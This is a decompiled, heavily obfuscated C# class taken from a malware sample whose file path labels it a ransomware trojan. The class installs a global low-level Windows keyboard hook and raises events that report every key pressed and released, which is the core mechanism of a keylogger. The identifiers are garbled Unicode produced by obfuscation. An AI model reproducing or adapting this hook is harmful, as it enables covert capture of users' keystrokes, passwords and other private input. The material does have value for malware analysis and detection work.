// Decompiled with JetBrains decompiler
// Type: 暜䙣�꟦瑁䦲ꬍ霺
// Assembly: WebComponent, Version=2.1.4.1, Culture=neutral, PublicKeyToken=null
// MVID: F1761C1B-9AF9-47E5-B5EF-97715B8D2A85
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-cad6c5114941c484f555ea157284268bc5ecd49897836f9e16d8e85310489a43.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

internal class 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺
{
  private const int 聪ዶ锯棧軅ꘚ塃掑 = 13;
  private const int \uEA6A嗣\uEEB8\uEFAD\u2379쾽\u1CB0᷑ = 0;
  private const int 觱䎺忓봸\u3297唗筈育 = 256;
  private const int 틀톞鴴\u05CC\uE775ဍ\u329C\uE5B5 = 257;
  private const int \u08DE낍\uFDE0鑷踪뢊ᆞᚾ = 260;
  private const int 퍽ু騜頟\uF069㤡恵Ά = 261;
  private 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.\uE62C쇚澭\uE494錟촪\uE7B8旍 ꚣ瀕粬퐊Џ웹\uECC0\uE1C1;
  private IntPtr \uFFFD능ﳇ\u240E賹홝Л뻹;

  [DllImport("User32.dll", EntryPoint = "SetWindowsHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  private static extern int ᛝᮯ죄ჷ箉䖯ᬆ坁(
    int _param0,
    暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.\uE62C쇚澭\uE494錟촪\uE7B8旍 _param1,
    IntPtr _param2,
    int ὲ扳鯠Ⰼ颵ꤔ깧癸);

  [DllImport("User32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  private static extern int ㄖ㥼曻\u0DC9쓴鸁슱鯬(
    int _param0,
    int _param1,
    IntPtr ὲ扳鯠Ⰼ颵ꤔ깧癸,
    IntPtr _param3);

  [DllImport("User32.dll", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  private static extern bool 떦꺬멦\u2655ມ䪰셀\uF684(int _param0);

  public static event 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.滚\uFDC8䧍쥔軈\u05C0粀ꓪ 촒뉾럘灞磙ฦ鑘䛥;

  public static event 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.鸒\uF080\uFFFD\u2325ᨗ뷌ꗨ㿹 \uED02铻\u087E縭镚㬌\uF7D3յ;

  private int 旮괺௫\u240E哘\u2ED2\u23DB\uE9AB(int _param1, IntPtr ὲ扳鯠Ⰼ颵ꤔ깧癸, IntPtr _param3)
  {
    if (_param1 == 0)
    {
      IntPtr num = ὲ扳鯠Ⰼ颵ꤔ깧癸;
      暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.阒椬爎ᐓ\u2F7E쵥\uFFFD\uFFFD 阒椬爎ᐓ쵥1;
      暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.阒椬爎ᐓ\u2F7E쵥\uFFFD\uFFFD 阒椬爎ᐓ쵥2;
      if (쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(num, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(256)) || 쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(num, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(260)))
      {
        暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.滚\uFDC8䧍쥔軈\u05C0粀ꓪ 貵譑摩ꉮ띮짅풿 = 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.貵譑摩ꉮ띮짅풿\uEDD6;
        if (貵譑摩ꉮ띮짅풿 != null)
        {
          暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.滚\uFDC8䧍쥔軈\u05C0粀ꓪ 滚䧍쥔軈粀ꓪ = 貵譑摩ꉮ띮짅풿;
          object obj = \uFFFD溦䓞콺ᕿٻ猶呶.晼驿㸙\u2FED瑲\u066C\uEFE1胧(_param3, ᆔኾꗘ몇砍섕뢅\u32D0.\uE12E\uF423ꍨ脱\uFFFD쇧\uFE5E\uE31D((object) 阒椬爎ᐓ쵥2));
          int 顣飛旳䣕굧괠 = checked ((int) (unchecked (obj != null) ? (暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.阒椬爎ᐓ\u2F7E쵥\uFFFD\uFFFD) obj : 阒椬爎ᐓ쵥1).\uEFFE顣飛旳\u274C䣕굧괠);
          ቺ蓲\uF0D0\u2452㲗鐺巨禰.좧\uE548䇹ᶅ條鷮ꬰꊯ((object) 滚䧍쥔軈粀ꓪ, (Keys) 顣飛旳䣕굧괠);
        }
      }
      else if (쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(num, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(257)) || 쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(num, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(261)))
      {
        暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.鸒\uF080\uFFFD\u2325ᨗ뷌ꗨ㿹 陖ꖲ蜠咾ᎃ = 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.陖\uE51Cꖲ\uE27C\u28A5蜠咾ᎃ;
        if (陖ꖲ蜠咾ᎃ != null)
        {
          暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.鸒\uF080\uFFFD\u2325ᨗ뷌ꗨ㿹 鸒ᨗ뷌ꗨ㿹 = 陖ꖲ蜠咾ᎃ;
          object obj = \uFFFD溦䓞콺ᕿٻ猶呶.晼驿㸙\u2FED瑲\u066C\uEFE1胧(_param3, ᆔኾꗘ몇砍섕뢅\u32D0.\uE12E\uF423ꍨ脱\uFFFD쇧\uFE5E\uE31D((object) 阒椬爎ᐓ쵥2));
          int 顣飛旳䣕굧괠 = checked ((int) (unchecked (obj != null) ? (暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.阒椬爎ᐓ\u2F7E쵥\uFFFD\uFFFD) obj : 阒椬爎ᐓ쵥1).\uEFFE顣飛旳\u274C䣕굧괠);
          饈\uE659狻ᥘ̲俘\u298A蛻.邴㨬ન躞炐ケ\uEEE8\u22D8((object) 鸒ᨗ뷌ꗨ㿹, (Keys) 顣飛旳䣕굧괠);
        }
      }
    }
    return 囖㑃뺽뇠ﮀ\uF6FB\uF73E腘.ꯖ뉒ঌ쌀湼Ţ\uFFFD첚(浤솑\uFFFD켅ᇛ\u00A6닂鳧.伲霏\u2260㼄㵖劆ἄⅆ(IntPtr.Zero), _param1, ὲ扳鯠Ⰼ颵ꤔ깧癸, _param3);
  }

  public 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺()
  {
    this.ꚣ瀕粬퐊Џ웹\uECC0\uE1C1 = new 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.\uE62C쇚澭\uE494錟촪\uE7B8旍(this.旮괺௫\u240E哘\u2ED2\u23DB\uE9AB);
    this.\uFFFD능ﳇ\u240E賹홝Л뻹 = IntPtr.Zero;
    this.\uFFFD능ﳇ\u240E賹홝Л뻹 = \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(猞氞䖔ﰈ㘵ᔨ讚鼜.Ρ瑅㘨粇ⷫ圕䮖僗(13, this.ꚣ瀕粬퐊Џ웹\uECC0\uE1C1, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(㞨冈爁\uF331罜\uF6F3䂻䠻.堠逑獹ꥷআᖀⰸꏦ(Գ䢽\u1CA5\u0608\uE96Dꨥ\u9FEAઉ.옙﨣\u09C6荪鑸딇粨\u204F((object) \u20FB\uAB1D\u3228燽\u2B8Aꭎⱘ녧.\uEA74먪珢遊샲Ⴎ\u0FD9\uF809())[0]).ToInt32()), 0));
    if (쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(this.\uFFFD능ﳇ\u240E賹홝Л뻹, IntPtr.Zero))
      throw \u26FC諵㪟ꌀ\uFFFD닅\uEE89\u25F6.渒怫虑ᨢ\u273D㑰칗뒹((string) \u003CModule\u003E.\uFFFDy\u0015\u00258\u003By(3755852716U));
  }

  ~暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺()
  {
    if (!쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(this.\uFFFD능ﳇ\u240E賹홝Л뻹, IntPtr.Zero))
      goto label_2;
label_1:
    꿲\u2611툹쥦ˣꔭ\u246D慞.\u28E7乼ꕲ醴䗄䐠ⲱ돩((object) this);
    return;
label_2:
    昞ꗤ\uE388ﵵ醍๔곞苦.\u4DF6䩮鄏姝\u28E3\u23FCڏ蕧(浤솑\uFFFD켅ᇛ\u00A6닂鳧.伲霏\u2260㼄㵖劆ἄⅆ(this.\uFFFD능ﳇ\u240E賹홝Л뻹));
    goto label_1;
  }

  private struct 阒椬爎ᐓ\u2F7E쵥\uFFFD\uFFFD
  {
    public uint \uEFFE顣飛旳\u274C䣕굧괠;
    public uint ꦑ쯬贕〯\u2FEA둱\uE7B2誅;
    public 暜䙣\uFFFD\uA7E6瑁䦲ꬍ霺.\u330F\uE77Eꆱㅼ瑝篇쉷䀹 鼃澵\uABFD\uFFFD\uFBCF\u28B5\u2A63寒;
    public uint \u104CẆʭ跒㝀灮陋Ζ;
    public UIntPtr \u2586\u2F0B빁쏧ង塹荚顄;
  }

  [Flags]
  private enum \u330F\uE77Eꆱㅼ瑝篇쉷䀹 : uint
  {
    LLKHF_EXTENDED = 1,
    LLKHF_INJECTED = 16, // 0x00000010
    LLKHF_ALTDOWN = 32, // 0x00000020
    LLKHF_UP = 128, // 0x00000080
  }

  public delegate void 滚\uFDC8䧍쥔軈\u05C0粀ꓪ(Keys Key);

  public delegate void 鸒\uF080\uFFFD\u2325ᨗ뷌ꗨ㿹(Keys Key);

  private delegate int \uE62C쇚澭\uE494錟촪\uE7B8旍(int nCode, IntPtr wParam, IntPtr lParam);
}
